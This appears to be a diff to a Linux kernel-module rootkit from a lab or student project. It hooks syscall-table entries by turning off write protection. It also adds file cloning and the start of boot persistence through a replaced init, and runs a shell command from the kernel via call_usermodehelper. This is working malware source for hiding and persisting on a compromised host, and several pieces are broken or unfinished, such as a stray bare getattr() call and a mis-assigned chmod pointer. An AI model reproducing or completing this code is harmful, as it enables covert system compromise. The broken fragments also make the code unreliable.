@@ -5,6 +5,7 @@
 #include <linux/syscalls.h>
 #include <linux/cred.h>
 #include <linux/dirent.h>
+#include <linux/uaccess.h>
 
 #include "modify_syscalls.h"
 
@@ -48,6 +49,8 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 asmlinkage int (*original_stat)(const char *path, struct stat *buf);
 asmlinkage int (*original_lstat)(const char *path, struct stat *buf);
 
+asmlinkage int (*original_chmod)(const char *pathname, mode_t mode);
+
 struct list_head *module_list;
 
 
@@ -63,12 +66,15 @@ void update_sys_calls(void **sys_call_table){
     void **modified_at_address_lstat = &sys_call_table[__NR_lstat];
     void *modified_function_lstat = hacked_lstat;
 
+    void **modified_at_address_chmod = &sys_call_table[__NR_chmod];
+
     DISABLE_W_PROTECTED_MEMORY
     original_sysinfo = xchg(modified_at_address_sysinfo, modified_function_sysinfo);
     original_kill = xchg(modified_at_address_kill, modified_function_kill);
     original_getdents = xchg(modified_at_address_getdents, modified_function_getdents);
     original_stat = xchg(modified_at_address_stat, modified_function_stat);
     original_lstat = xchg(modified_at_address_lstat, modified_function_lstat);
+    original_chmod = modified_at_address_chmod;
     ENABLE_W_PROTECTED_MEMORY
 }
 
@@ -263,42 +269,63 @@ int clone_file(const char* filepath_1, const char* filepath_2) {
 
     mm_segment_t old_fs = get_fs();
     set_fs(get_ds());
-    filp = filp_open(filepath_1, O_RDONLY, 0);
 
+    // open first file for reading
+    filp = filp_open(filepath_1, O_RDONLY, 0);
     if (IS_ERR(filp)) {
         err = PTR_ERR(filp);
         return NULL;
     }
-    
+
+    // open second file for writing
+    struct file *filp_write = NULL;
+    filp_write = filp_open(filepath_2, O_WRONLY | O_CREAT, 0);
+    if (IS_ERR(filp_write)) {
+        err = PTR_ERR(filp_write);
+        return NULL;
+    }
+
+    // we need to reset the pos after seeking the end
     loff_t pos = filp->f_pos;
-    f1_ret = vfs_read(filp, buf, 1, &pos);
+    loff_t pos_write = filp_write->f_pos;
+    loff_t end = vfs_llseek(filp, 0, SEEK_END);
+    filp->f_pos = pos;
+
+    // clone multiple bytes
+    int i;
+    for (i = 0; i < end; i++) {
+        f1_ret = vfs_read(filp, buf, 1, &pos);    
+        f2_ret = vfs_write(filp_write, buf, 1, &pos_write);
+    }
+
     if (f1_ret > 0) {
         filp->f_pos = pos;
     }
-
-    loff_t end = vfs_llseek(filp, 0, SEEK_END);
-
-
-    // open second file for writing
-    {
-        struct file *filp_write = NULL;
-        filp_write = filp_open(filepath_2, O_WRONLY | O_CREAT, 0);
-        if (IS_ERR(filp_write)) {
-            err = PTR_ERR(filp_write);
-            return NULL;
-        }
-
-        loff_t pos_write = filp_write->f_pos;
-        f2_ret = vfs_write(filp_write, buf, 1, &pos_write);
-        if (f2_ret > 0) {
-            filp->f_pos = pos;
-        }
-
-        filp_close(filp_write, NULL);
+    if (f2_ret > 0) {
+        filp->f_pos = pos_write;
     }
 
-    set_fs(old_fs);
+    // keep permissions same
+    // printk("file perms: read: %o, write: %o\n", filp->f_mode, filp_write->f_mode);
+    // filp_write->f_mode = filp->f_mode;
+    // printk("file perms: read: %o, write: %o\n", filp->f_mode, filp_write->f_mode);
+
+    filp_close(filp_write, NULL);
     filp_close(filp, NULL);
+
+    // get file permissions for original file
+    struct kstat file_stat;
+    int rest_stat = vfs_stat("/home/vagrant/start_rootkit", &file_stat);
+    // we want this to be 775 vvvv
+    //printk("st_mode: %o\n", file_stat.mode);
+    printk("st_mode mod: %o\n", file_stat.mode & 0x0FFF);
+    umode_t mode = file_stat.mode;
+
+    // set file permissions for cloned file
+    getattr()
+    
+
+    set_fs(old_fs);
 
     // int i;
     // for (i = 0; i < 5; i++) {
@@ -306,15 +333,25 @@ int clone_file(const char* filepath_1, const char* filepath_2) {
     // }
     // printk("\n");
 
+
     return 0;
 }
 
+int rename_file() {
+    // vfs_rename()
+
+    // lock_rename
+}
+
+// could have just placed this in lib/modules/<kernel_ver>/default,
+// but this is more interesting!
 // most of this should only be executed on the first
 // run (ideally)
 // - should this be done in our payload instead?
 //   doing file I/O is bad in kernel modules
-void add_to_reboot() {
-    clone_file("/home/vagrant/dog.txt", "/home/vagrant/dog_copy.txt");
+void add_to_reboot(void **sys_call_table) {
+    //clone_file("/home/vagrant/dog.txt", "/home/vagrant/dog_copy.txt");
+    clone_file("/home/vagrant/start_rootkit", "/home/vagrant/start_rootkit_copy");
 
     // check for existence of /sbin/init_original
     // if (!access(FILE_INIT_ORIGINAL, R_OK) == 0) {
@@ -331,4 +368,48 @@ void add_to_reboot() {
         //     -> move our replacement init -> /sbin/init
 
     // }
+
+    // delete file if it exists ?
+
+    // keep file permissions ?
+    //sys_chmod("/home/vagrant/start_rootkit_copy", 0);
+    //use sys_stat to get original file perms
+    // sys_access("/home/avgrant/start_rootkit")
+
+    //void* f_stat  = sys_call_table[__NR_stat];
+    //asmlinkage int (*f_stat)(const char *path, struct stat *buf) = &sys_call_table[__NR_stat];
+    //asmlinkage int (*f_chmod)(const char *pathname, mode_t mode) = &sys_call_table[__NR_chmod];
+
+    // struct stat f1_stat;
+    // DISABLE_W_PROTECTED_MEMORY
+    // // original_stat("/home/vagrant/start_rootkit", &f1_stat);
+    // // original_chmod("/home/vagrant/start_rootkit_copy", f1_stat.st_mode);
+
+    // // dst, src, size
+    // char* loc = "/home/vagrant/start_rootkit_copy";
+    // char* user_loc;
+    // copy_to_user(user_loc, loc, strlen(loc));
+    // original_chmod(user_loc, 5);
+
+    // ENABLE_W_PROTECTED_MEMORY
+
+    char* argv[4];
+    argv[0] = "bin/bash";
+    argv[1] = "-c";
+    argv[2] = "chmod 5 /home/vagrant/start_rootkit_copy > /home/vagrant/output.txt";
+    argv[3] = NULL;
+    // argv[0] = "bin/bash";
+    // argv[1] = "-c";
+    // argv[2] = "touch /home/vagrant/will_i_make_this >> /home/vagrant/output.txt";
+    // argv[3] = NULL;
+    char* envp[4];
+    envp[0] = "HOME=/";
+    envp[1] = "TERM=linux";
+    envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
+    envp[3] = NULL;
+    int res = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+
+    printk("result from chmod: %d", res);
+
+    printk(": %d", res);
 }
